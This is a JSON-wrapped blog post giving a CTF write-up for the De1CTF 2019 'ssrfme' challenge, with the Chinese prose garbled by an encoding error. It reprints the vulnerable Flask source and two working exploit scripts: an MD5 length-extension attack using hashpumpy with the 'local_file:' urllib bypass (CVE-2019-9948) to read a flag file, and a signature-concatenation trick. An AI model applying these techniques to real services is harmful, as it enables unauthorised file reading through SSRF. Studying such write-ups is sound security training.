{"title":"De1ctf","slug":"De1ctf","date":"2019-08-16T12:00:50.000Z","updated":"2019-09-03T14:24:23.083Z","comments":true,"path":"api/articles/De1ctf.json","photos":[],"link":"","excerpt":"è¿™æ¬¡æ¯”èµ›çœŸçš„è¶…æœ‰æ„æ€çš„ï¼æˆ‘è¶…çº§å–œæ¬¢çš„ï¼åšäº†åŠå¤©å•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹ç€é‚£ä¸ªæ¨±èŠ±ğŸŒ¸å…¨ç¨‹é™¶é†‰~","covers":null,"content":"<p>è¿™æ¬¡æ¯”èµ›çœŸçš„è¶…æœ‰æ„æ€çš„ï¼æˆ‘è¶…çº§å–œæ¬¢çš„ï¼åšäº†åŠå¤©å•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹ç€é‚£ä¸ªæ¨±èŠ±ğŸŒ¸å…¨ç¨‹é™¶é†‰~</p>\n<a id=\"more\"></a>\n<h1 id=\"De1ctf-2019-WP\"><a href=\"#De1ctf-2019-WP\" class=\"headerlink\" title=\"De1ctf 2019 WP\"></a>De1ctf 2019 WP</h1><h2 id=\"ssrfme\"><a href=\"#ssrfme\" class=\"headerlink\" title=\"ssrfme\"></a>ssrfme</h2><p>æºç  </p>\n<pre><code>#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding(&apos;latin1&apos;)\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result[&apos;code&apos;] = 500\n        if (self.checkSign()):\n            if &quot;scan&quot; in self.action:\n                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)\n                resp = scan(self.param)\n                if (resp == &quot;Connection Timeout&quot;):\n                    result[&apos;data&apos;] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result[&apos;code&apos;] = 200\n            if &quot;read&quot; in self.action:\n                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)\n                result[&apos;code&apos;] = 200\n                result[&apos;data&apos;] = f.read()\n            if result[&apos;code&apos;] == 500:\n                result[&apos;data&apos;] = &quot;Action Error&quot;\n        else:\n            result[&apos;code&apos;] = 500\n            result[&apos;msg&apos;] = &quot;Sign Error&quot;\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n#generate Sign For Action Scan.\n@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])\ndef geneSign():\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    action = &quot;scan&quot;\n    return getSign(action, param)\n\n\n@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(&quot;action&quot;))\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))\n    ip = request.remote_addr\n    if(waf(param)):\n        return &quot;No Hacker!!!!&quot;\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route(&apos;/&apos;)\ndef index():\n    return open(&quot;code.txt&quot;,&quot;r&quot;).read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return &quot;Connection Timeout&quot;\n\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):\n        return True\n    else:\n        return False\n\n\nif __name__ == &apos;__main__&apos;:\n    app.debug = False\n    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id=\"æºç åˆ†æ\"><a href=\"#æºç åˆ†æ\" class=\"headerlink\" title=\"æºç åˆ†æ\"></a>æºç åˆ†æ</h3><p><code>Exec()</code>å‡½æ•°é¦–å…ˆè°ƒç”¨<code>checkSign()</code>è¿›è¡Œmd5æ ¡éªŒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ç»•è¿‡ã€‚æ¥ä¸‹æ¥å¯¹scanè¡Œä¸ºè¿›è¡Œæ‰“å¼€æ–‡æœ¬æ–‡ä»¶ï¼Œè°ƒç”¨<code>scan()</code>è¯»å–å†…å®¹ï¼Œç„¶åå°†ç›®æ ‡æ–‡ä»¶å†…å®¹å†™å…¥æ–‡ä»¶ã€‚å¯¹readè¡Œä¸ºè¿›è¡Œåˆšåˆšå†™å…¥æ–‡ä»¶çš„è¯»å–ã€‚</p>\n<pre><code>def Exec(self):\n    result = {}\n    result[&apos;code&apos;] = 500\n    if (self.checkSign()):\n        if &quot;scan&quot; in self.action:\n            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)\n            resp = scan(self.param)\n            if (resp == &quot;Connection Timeout&quot;):\n                result[&apos;data&apos;] = resp\n            else:\n                print resp\n                tmpfile.write(resp)\n                tmpfile.close()\n            result[&apos;code&apos;] = 200\n        if &quot;read&quot; in self.action:\n            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)\n            result[&apos;code&apos;] = 200\n            result[&apos;data&apos;] = f.read()\n        if result[&apos;code&apos;] == 500:\n            result[&apos;data&apos;] = &quot;Action Error&quot;\n    else:\n        result[&apos;code&apos;] = 500\n        result[&apos;msg&apos;] = &quot;Sign Error&quot;\n    return result\n\ndef checkSign(self):\n    if (getSign(self.action, self.param) == self.sign):\n        return True\n    else:\n        return False</code></pre><p><code>/geneSign</code>è·¯ç”±è´Ÿè´£ç”ŸæˆSignã€‚åŒæ—¶<code>action</code>è¢«é™å®šä¸º<code>scan</code></p>\n<pre><code>#generate Sign For Action Scan.\n@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])\ndef geneSign():\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    action = &quot;scan&quot;\n    return getSign(action, param)</code></pre><p><code>/De1ta</code>è·¯ç”±å¯¹è¯·æ±‚çš„<code>param</code>å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œç„¶åé€šè¿‡å¯¹<code>Task</code>ç±»ä¼ å…¥ç›¸åº”å‚æ•°æ‰“å°<code>Exec()</code>å‡½æ•°çš„ç»“æœ</p>\n<pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(&quot;action&quot;))\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))\n    ip = request.remote_addr\n    if(waf(param)):\n        return &quot;No Hacker!!!!&quot;\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>å‡½æ•°æ‰“å¼€<code>param</code>æŒ‡å‘çš„å†…å®¹è¿›è¡Œè¯»å–ï¼Œè¿™æ˜¯æˆ‘ä»¬åˆ©ç”¨<code>ssrf</code>çš„ç‚¹ã€‚</p>\n<pre><code>def scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return &quot;Connection Timeout&quot;</code></pre><p>getSign()å‡½æ•°å¯¹<code>secerty_key,param,action</code>è¿›è¡Œmd5åŠ å¯†ã€‚</p>\n<pre><code>def getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>ä»£ç çš„é€»è¾‘å¤§ä½“ä¸Šæ˜¯</p>\n<pre><code>åˆå§‹åŒ–å„ä¸ªå‚æ•°-&gt;è¿›å…¥Taskç±»-&gt;æ‰§è¡ŒExec()å‡½æ•°-&gt;æ£€æŸ¥md5å€¼-&gt;å¯¹å‚æ•°ä¸­çš„actionè¿›è¡Œä¸åŒæ“ä½œ-&gt;dumpå‡½æ•°æ‰§è¡Œç»“æœ</code></pre><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ç»•è¿‡é•¿åº¦åˆ¤æ–­ï¼Œæ ¹æ®æç¤ºflagåœ¨<code>/flag.txt</code>ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯<code>waf()</code>å¯¹<code>gopher</code>å’Œ<code>file</code>è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨è¿™ä¸¤ä¸ªåè®®ï¼Œæ ¹æ®CVE-2019-9948(urllib)<a href=\"https://www.cvedetails.com/cve/CVE-2019-9948/\" title=\"CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">https://www.cvedetails.com/cve/CVE-2019-9948/</a>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>local_file:///flag.txt</code>æ¥ç»•è¿‡wafã€‚</p>\n<h3 id=\"ç¼–å†™è„šæœ¬\"><a href=\"#ç¼–å†™è„šæœ¬\" class=\"headerlink\" title=\"ç¼–å†™è„šæœ¬\"></a>ç¼–å†™è„šæœ¬</h3><pre><code>import urllib,hashpumpy \nimport requests\n\n&quot;&quot;&quot;\n    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)\n\n    Arguments:\n        hexdigest(str):      Hex-encoded result of hashing key + original_data.\n        original_data(str):  Known data used to get the hash result hexdigest.\n        data_to_add(str):    Data to append\n        key_length(int):     Length of unknown data prepended to the hash\n\n    Returns:\n        A tuple containing the new hex digest and the new message.\n\n&quot;&quot;&quot;\n\nurl = &quot;http://139.180.128.86/&quot;\n\n#get the Sign of Scan\ngeneSign = &quot;geneSign?&quot;\npayload = &quot;local_file:flag.txt&quot;\nre = requests.get(url+geneSign+&quot;param=&quot;+payload).text\nprint re\n\n#hash extend attack\nhashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)\nprint hashs\naction = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;\ncookie = {\n    #&quot;action&quot;:urllib.quote(hashextend),\n    &quot;action&quot;:action,    \n    &quot;sign&quot;:hashs\n}\nprint cookie\n\n\nre2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)\n\nprint re2.content</code></pre><p>åœ¨ä½¿ç”¨æ‰©å±•æ”»å‡»çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æŠŠæ‰€å¾—ç­¾åå‰é¢çš„ä¿¡æ¯å»æ‰</p>\n<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce\nInput Data: local_file:flag.txtscan\nInput Key Length: 16\nInput Data to Add: read\n636d649a50e61e75436cc1ba50d5a003\nlocal_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</code></pre><h3 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h3><p>åœ¨ctf timeä¸Šçœ‹åˆ°çš„å›ç­”ï¼Œåˆ†æçš„å¥½ç»†è‡´<a href=\"https://ctftime.org/writeup/16070\" target=\"_blank\" rel=\"noopener\">https://ctftime.org/writeup/16070</a>ã€‚è¿™é‡Œæä¾›äº†å¦ä¸€ç§æ€è·¯</p>\n<blockquote>\n<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including â€œreadâ€. If we can generate a sign for the action as â€œreadscanâ€, we can perform the scan and read the result in one go.</p>\n<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as â€œflag.txtreadâ€ (the value of action will be â€œscanâ€) and generate the same hash as if we pass param as â€œflag.txtâ€ and action as â€œreadscanâ€.</p>\n<p>â€œflag.txtreadâ€+â€scanâ€ == â€œflag.txtâ€+â€readscanâ€</p>\n<p>You could also use a length extension attack, but this way is more simple.</p>\n<p>So our exploit is complete.</p>\n</blockquote>\n<p>è¿™æ˜¯ä»–ä»¬ç¼–å†™çš„è„šæœ¬ï¼šè†œ</p>\n<pre><code>import requests\n\ndef geneSign(param):\n    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text\n\nrealParam = &quot;flag.txt&quot;\n\nparam = realParam+&quot;read&quot;\nsign = geneSign(param)\nparam = realParam\n\naction = &quot;readscan&quot;\n\nanswer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text\n\nprint(answer)</code></pre>","categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]}